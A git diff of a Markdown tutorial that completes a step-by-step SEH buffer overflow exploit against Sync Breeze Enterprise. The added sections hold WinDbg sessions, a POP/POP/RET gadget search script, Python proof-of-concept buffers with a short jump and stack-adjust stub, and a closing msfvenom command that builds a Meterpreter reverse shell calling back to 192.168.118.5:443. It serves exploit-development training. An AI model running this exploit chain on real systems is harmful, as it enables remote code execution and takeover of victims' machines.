@@ -7,10 +7,11 @@
 4. [Gaining Control of Exception Hanlder.](#GCEH)
 5. [Detecting Bad Characters.](#BadChars)
 6. [Finding a P/P/R Instruction.](#PPR)
-7. [Short Jump.](#ShortJump)
-8. [Locate the shellcode.](#LocateShellcode)
-9. [Reach our shellcode.](#ReachShellcode)
-10. [Get a Shell!](#Shell)
+7. [Gaining control of Instruction Pointer.](#ESP)
+8. [Short Jump.](#ShortJump)
+9. [Locate the shellcode.](#LocateShellcode)
+10. [Reach our shellcode.](#ReachShellcode)
+11. [Get a Shell!](#Shell)
 
 ### Crash the application.<a href="crash"></a>
 
@@ -110,7 +111,7 @@ As we do not control the stack in our scenario, we can't redirect the execution 
 Generate a unique string to locate the exact offset of the exception handler.
 
 ```bash
-┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
+┌──(v0lk3n㉿Laptop)-[~/SEH-Overflow-Basic]
 └─$ msf-pattern_create -l 1000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac...
 ```
@@ -149,7 +150,7 @@ Invalid exception stack at 65413165
 Search for the exact offset.
 
 ```bash
-┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
+┌──(v0lk3n㉿Laptop)-[~/SEH-Overflow-Basic]
 └─$ msf-pattern_offset -q 33654132 -l 1000
 [*] Exact match at offset 128
 ```
@@ -272,20 +273,565 @@ Now that our characters are located, repeat the step above until found all bad c
 
 ### Finding a P/P/R Instructions.<a href="PPR"></a>
 
-TODO
+First, we need to find a module without protection that didnt containt any bad characters.
+
+```bash
+0:010> !load narly
+
+0:010> !nmod
+00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
+00540000 00614000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
+00820000 008d5000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
+10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+
+```
+
+The "libspp.dll" seem to be perfect.
+
+Now, we need to search a P/P/R instruction sequence inside the module. To do it we need to retrieve the start and end memory address.
+
+```bash
+0:010> lm m libspp
+Browse full module list
+start    end        module name
+10000000 10226000   libspp     (deferred)             
+```
+
+Now we need to get all the possible opcodes for the POP instructions for each x86 register, excluding the stack pointer (ESP). And the opcode for the RET instruction.
+
+```bash
+┌──(v0lk3n㉿Laptop)-[/SEH-Overflow-Basic]
+└─$ msf-nasm_shell
+nasm > POP EAX
+00000000  58                pop eax
+nasm > POP EBX
+00000000  5B                pop ebx
+nasm > POP ECX
+00000000  59                pop ecx
+nasm > POP EBP
+00000000  5D                pop ebp
+nasm > POP EDX
+00000000  5A                pop edx
+nasm > POP ESI
+00000000  5E                pop esi
+nasm > POP EDI
+00000000  5F                pop edi
+nasm > ret
+00000000  C3                ret
+```
+
+Create a little WinDbg script that will create every possible POP R32 combination and search for it inside the memory range of the module, and execute it.
+
+```wds
+.block  
+{  
+	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01)  
+	{  
+		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01)  
+		{  
+			s-[1]b 10000000 10226000 $t0 $t1 c3  
+		}  
+	}  
+}
+```
+
+```bash
+0:010> $><C:\Installers\seh_overflow\find_ppr.wds
+0x1015a2f0 #<= The one i took.
+0x100087dd
+0x10008808
+0x1000881a
+0x10008829
+...
+```
+
+As expected, the script return a list of all memory addresses from the module. Select and address without bad characters in it, and verify that it point to a P/P/R instruction sequence.
+
+```bash
+0:010> u 1015a2f0 L3
+*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+1015a2f1 5b              pop     ebx
+1015a2f2 c3              ret
+```
+
+The address points to valid sequence of instructions, and doesn't contain any bad chars.
+
+### Gaining control of Instruction Pointer.<a href="ESP"></a>
+
+Now we can update the PoC and try to overwrite the instruction pointer with the P/P/R instruction.
+
+```python
+...
+size = 1000
+
+aBuffer = b"A" * 128
+bBuffer = pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+cBuffer = b"C" * 868
+inputBuffer = aBuffer + bBuffer + cBuffer
+...
+```
+
+Run the PoC and inspect the Exception Handler chain.
+
+```bash
+0:009> !exchain
+0081fe0c: libpal!md5_starts+149fb (005cdf5b)
+0081ff44: libspp!pcre_exec+16460 (1015a2f0) #<= P/P/R address
+Invalid exception stack at 41414141
+
+0:009> u 1015a2f0 L3
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+1015a2f1 5b              pop     ebx
+1015a2f2 c3              ret
+
+```
+
+As we can see, we successfully overwritted the Exception Handler with our P/P/R instructions sequence.
+
+Set a breakpoint to the P/P/R and continue the execution flow. Once we reach our breakpoint, single step through the POP instructions and inspect the address we will be returning into (RET).
+
+```bash
+0:009> bp 0x1015a2f0
+
+0:009> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f0 esp=0081f440 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+
+0:009> t
+eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f1 esp=0081f444 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16461:
+1015a2f1 5b              pop     ebx
+
+0:009> t
+eax=77705b32 ebx=0081f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f2 esp=0081f448 ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16462:
+1015a2f2 c3              ret
+
+0:009> dd poi(esp) L10
+0081ff44  41414141 1015a2f0 43434343 43434343
+0081ff54  43434343 43434343 43434343 43434343
+0081ff64  43434343 43434343 43434343 43434343
+0081ff74  43434343 43434343 43434343 43434343
+
+0:009> t
+eax=77705b32 ebx=0081f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0081ff44 esp=0081f44c ebp=0081f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0081ff44 41              inc     ecx
+
+```
+
+We can see that after executing the RET instruction, we returned into the stack within our controlled buffer right before our Exception Handler address.
 
 ### Short Jump.<a href="ShortJump"></a>
 
-TODO
+Now, inspect the resulting assembly instructions inside WinDbg.
+
+```bash
+0:009> u eip L10
+0081ff44 41              inc     ecx
+0081ff45 41              inc     ecx
+0081ff46 41              inc     ecx
+0081ff47 41              inc     ecx
+0081ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
+0081ff4e 43              inc     ebx
+0081ff4f 43              inc     ebx
+0081ff50 43              inc     ebx
+0081ff51 43              inc     ebx
+0081ff52 43              inc     ebx
+0081ff53 43              inc     ebx
+0081ff54 43              inc     ebx
+0081ff55 43              inc     ebx
+0081ff56 43              inc     ebx
+0081ff57 43              inc     ebx
+0081ff58 43              inc     ebx
+```
+
+We can see that the bytes composing the P/P/R address are translated to a "lock mov byte" instruction.
+
+The instruction uses part of our buffer as a destination address to write the content of the AL register.
+
+As this memory address isn't mapped, once executed, it will trigger another access violation and break our exploit.
+
+To overcome this we can use Short Jump to redirect the execution flow directly after this instruction.
+
+After had single step through the P/P/R instructions, let's assemble the short jump and get it's opcodes.
+
+```bash
+0:009> dds eip L4
+0081ff44  41414141
+0081ff48  1015a2f0 libspp!pcre_exec+0x16460 # We should execute this.
+0081ff4c  43434343							# We want to execute this.
+0081ff50  43434343
+
+0:009> a
+0081ff44 jmp 0x0081ff4c
+jmp 0x0081ff4c
+0081ff46 
+
+0:009> u eip L5
+0081ff44 eb06            jmp     0081ff4c # Our short jump
+0081ff46 41              inc     ecx
+0081ff47 41              inc     ecx
+0081ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
+0081ff4e 43              inc     ebx
+
+0:009> dds eip L3
+0081ff44  414106eb # Our short jump
+0081ff48  1015a2f0 libspp!pcre_exec+0x16460
+0081ff4c  43434343
+
+```
+
+Great, now we can update our PoC to include it.
+
+```python
+size = 1000
+
+inputBuffer = b"\x41" * 124
+inputBuffer += pack("<L", (0x06eb9090)) # (Short Jump Address)
+inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+inputBuffer += b"\x41" * (size - len(inputBuffer))
+```
+
+Run the PoC, set a breakpoint to the P/P/R instruction, and let the debugger continue until it hit our breakpoint.
+
+Then singe step through the P/P/R instruction sand reach our short jump.
+
+```bash
+0:011> t
+eax=77705b32 ebx=01a1f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=01a1ff45 esp=01a1f44c ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+01a1ff45 90              nop
+0:011> t
+eax=77705b32 ebx=01a1f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=01a1ff46 esp=01a1f44c ebp=01a1f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+01a1ff46 eb06            jmp     01a1ff4e
+0:011> dd 01a1ff4e - 0x06
+01a1ff48  1015a2f0 41414141 41414141 41414141
+01a1ff58  41414141 41414141 41414141 41414141
+01a1ff68  41414141 41414141 41414141 41414141
+01a1ff78  41414141 41414141 41414141 41414141
+01a1ff88  41414141 41414141 41414141 41414141
+01a1ff98  41414141 41414141 41414141 41414141
+01a1ffa8  41414141 41414141 41414141 41414141
+01a1ffb8  41414141 41414141 41414141 41414141
+```
+
+As we can see, if we execute the short jump, we will indeed land in our buffer right after the SEH.
 
 ### Locate the Shellcode.<a href="LocateShellcode"></a>
 
-TODO
+Now inspecting the memory pointed to by the instruction pointer, we see that we are very close to reaching the beginning of our stack.
+
+```bash
+0:011> dd eip L30
+01a1ff46  a2f006eb 41411015 41414141 41414141
+01a1ff56  41414141 41414141 41414141 41414141
+01a1ff66  41414141 41414141 41414141 41414141
+01a1ff76  41414141 41414141 41414141 41414141
+01a1ff86  41414141 41414141 41414141 41414141
+01a1ff96  41414141 41414141 41414141 41414141
+01a1ffa6  41414141 41414141 41414141 41414141
+01a1ffb6  41414141 41414141 41414141 41414141
+01a1ffc6  41414141 ff004141 84b001a1 966b776f
+01a1ffd6  000085cf ffec0000 267901a1 ffff7768
+01a1ffe6  5ca3ffff 00007770 00000000 3e100000
+01a1fff6  3b50008b 000000de ???????? ????????
+
+0:011> !teb
+TEB at 00380000
+    ExceptionList:        01a1f454
+    StackBase:            01a20000
+    StackLimit:           01a1e000
+...
+```
+
+Maybe we can fit a small shellcode, but it's better to expand the buffer size to put a reverse shell shellcode.
+
+Update our PoC adding a shellcode variable to expand our buffer size and some NOPs instruction after our POP POP RET instructions.
+
+```python
+...
+size = 1000
+
+shellcode = b"\x43" * 400
+
+inputBuffer = b"\x41" * 124
+inputBuffer += pack("<L", (0x06eb9090)) # (NSEH)
+inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
+inputBuffer += shellcode
+...
+```
+
+Run the PoC, set a breakpoint to the P/P/R, continue the execution flow, single step since reaching the next instruction of our short jump. Then see the TEB structure.
+
+```bash
+0:009> bp 0x1015a2f0
+*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+
+0:009> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f0 esp=007bf440 ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+
+0:009> t
+eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f1 esp=007bf444 ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16461:
+1015a2f1 5b              pop     ebx
+
+...
+
+0:009> t
+eax=77705b32 ebx=007bf540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=007bff46 esp=007bf44c ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+007bff46 eb06            jmp     007bff4e
+
+0:009> t
+eax=77705b32 ebx=007bf540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=007bff4e esp=007bf44c ebp=007bf460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+007bff4e 90              nop
+
+0:009> !teb
+TEB at 0036d000
+    ExceptionList:        007bf454
+    StackBase:            007c0000
+    StackLimit:           007be000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+    ArbitraryUserPointer: 00000000
+    Self:                 0036d000
+    EnvironmentPointer:   00000000
+    ClientId:             00001d94 . 00001620
+    RpcHandle:            00000000
+    Tls Storage:          00523248
+    PEB Address:          0035f000
+    LastErrorValue:       0
+    LastStatusValue:      c000000d
+    Count Owned Locks:    0
+    HardErrorMode:        0
+
+```
+
+Now that we get the Stack base and limit, we can search for our NOPs instruction followed by our C buffer in it.
+
+Once located, calculate the size of our buffer.
+
+```bash
+0:009> s -b 007be000 007c0000 90 90 90 90 43 43 43 43 43 43
+007bfc60  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
+```
+
+Verify that our DWORDs buffer isn't truncated.
+
+```bash
+0:009> dd 007bfc60
+007bfc60  90909090 43434343 43434343 43434343
+007bfc70  43434343 43434343 43434343 43434343
+007bfc80  43434343 43434343 43434343 43434343
+007bfc90  43434343 43434343 43434343 43434343
+007bfca0  43434343 43434343 43434343 43434343
+007bfcb0  43434343 43434343 43434343 43434343
+007bfcc0  43434343 43434343 43434343 43434343
+007bfcd0  43434343 43434343 43434343 43434343
+
+0:009> dd 007bfc64 L65
+007bfc64  43434343 43434343 43434343 43434343
+007bfc74  43434343 43434343 43434343 43434343
+007bfc84  43434343 43434343 43434343 43434343
+007bfc94  43434343 43434343 43434343 43434343
+007bfca4  43434343 43434343 43434343 43434343
+007bfcb4  43434343 43434343 43434343 43434343
+007bfcc4  43434343 43434343 43434343 43434343
+007bfcd4  43434343 43434343 43434343 43434343
+007bfce4  43434343 43434343 43434343 43434343
+007bfcf4  43434343 43434343 43434343 43434343
+007bfd04  43434343 43434343 43434343 43434343
+007bfd14  43434343 43434343 43434343 43434343
+007bfd24  43434343 43434343 43434343 43434343
+007bfd34  43434343 43434343 43434343 43434343
+007bfd44  43434343 43434343 43434343 43434343
+007bfd54  43434343 43434343 43434343 43434343
+007bfd64  43434343 43434343 43434343 43434343
+007bfd74  43434343 43434343 43434343 43434343
+007bfd84  43434343 43434343 43434343 43434343
+007bfd94  43434343 43434343 43434343 43434343
+007bfda4  43434343 43434343 43434343 43434343
+007bfdb4  43434343 43434343 43434343 43434343
+007bfdc4  43434343 43434343 43434343 43434343
+007bfdd4  43434343 43434343 43434343 43434343
+007bfde4  43434343 43434343 43434343 43434343
+007bfdf4  fffffffe
+```
 
 ### Reach our Shellcode.<a href="ReachShellcode"></a>
 
-TODO
+Now we need to find the offset from our current stack pointer to the beggining of our shellcode.
+
+```bash
+0:009> s -b 007be000 007c0000 90 90 90 90 43 43 43 43 43 43
+007bfc60  90 90 90 90 43 43 43 43-43 43 43 43 43 43 43 43  ....CCCCCCCCCCCC
+
+0:009> dd 007bfc60
+007bfc60  90909090 43434343 43434343 43434343
+007bfc70  43434343 43434343 43434343 43434343
+007bfc80  43434343 43434343 43434343 43434343
+007bfc90  43434343 43434343 43434343 43434343
+007bfca0  43434343 43434343 43434343 43434343
+007bfcb0  43434343 43434343 43434343 43434343
+007bfcc0  43434343 43434343 43434343 43434343
+007bfcd0  43434343 43434343 43434343 43434343
+
+0:009> ? 007bfc64 - @esp
+Evaluate expression: 2072 = 00000818
+
+```
+
+Using the space available after our short jump, we will assemble instructions to increase the stack pointer by 830 bytes followed by a "JMP ESP" to jump to our shellcode next.
+
+Generate the opcodes and verify that it didn't containt any bad characters.
+
+```bash
+┌──(v0lk3n㉿Omen-Laptop)-[~/SEH-Overflow-Basic]
+└─$ msf-nasm_shell
+nasm > add sp, 0x830
+00000000  6681C43008        add sp,0x830
+nasm > jmp esp
+00000000  FFE4              jmp esp
+```
+
+Now update the PoC to add those two instructions.
+
+```python
+...
+size = 1000
+
+shellcode = b"\x90" * 8
+shellcode += b"\x43" * (400 - len(shellcode))
+
+inputBuffer = b"\x41" * 124
+inputBuffer += pack("<L", (0x06eb9090)) # (NSEH)
+inputBuffer += pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+inputBuffer += b"\x90" * 2
+inputBuffer += b"\x66\x81\xc4\x30\x08"  # add sp, 0x830
+inputBuffer += b"\xff\xe4"              # jmp esp
+inputBuffer += b"\x90" * (size - len(inputBuffer) - len(shellcode))
+inputBuffer += shellcode
+...
+```
+
+Execute the PoC, set a break point to the P/P/R and continue the execution. Single step through each isntruction to confrim that it's correct.
+
+```bash
+0:009> bp 1015a2f0
+*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
+0:009> g
+Breakpoint 0 hit
+eax=00000000 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f0 esp=0182f440 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16460:
+1015a2f0 58              pop     eax
+
+0:009> t
+eax=77705b32 ebx=00000000 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f1 esp=0182f444 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16461:
+1015a2f1 5b              pop     ebx
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=1015a2f2 esp=0182f448 ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+libspp!pcre_exec+0x16462:
+1015a2f2 c3              ret
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0182ff44 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0182ff44 90              nop
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0182ff45 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0182ff45 90              nop
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0182ff46 esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0182ff46 eb06            jmp     0182ff4e
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0182ff4e esp=0182f44c ebp=0182f460 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+0182ff4e 6681c43008      add     sp,830h
+
+0:009> t
+eax=77705b32 ebx=0182f540 ecx=1015a2f0 edx=77705b50 esi=00000000 edi=00000000
+eip=0182ff53 esp=0182fc7c ebp=0182f460 iopl=0         nv up ei ng nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
+0182ff53 ffe4            jmp     esp {0182fc7c}
+
+0:009> dd @esp L4
+0182fc7c  43434343 43434343 43434343 43434343
+
+```
+
+We can see all our intruction, but it appear that esp didnt point to the beginning of our shellcode buffer as we dont see our NOPS instruction.
+
+To overcome this simply expand the number of NOPs instruction before our shellcode.
+
+```python
+...
+size = 1000
+
+shellcode = b"\x90" * 20
+shellcode += b"\x43" * (400 - len(shellcode))
+...
+```
+
+```bash
+0:010> dd @esp L4  
+01cafc74 90909090 90909090 43434343 43434343  
+  
+0:010> t  
+eax=77383b02 ebx=01caf540 ecx=1015a2f0 edx=77383b20 esi=00000000 edi=00000000  
+eip=01cafc74 esp=01cafc74 ebp=01caf458 iopl=0 nv up ei ng nz na pe nc  
+cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000286  01cafc74 90 nop
+```
 
 ### Get a Shell!<a href="Shell"></a>
 
-TODO
+Generate the shellcode and update the PoC.
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
+```
+
+Start a listener and run the PoC to get a shell!
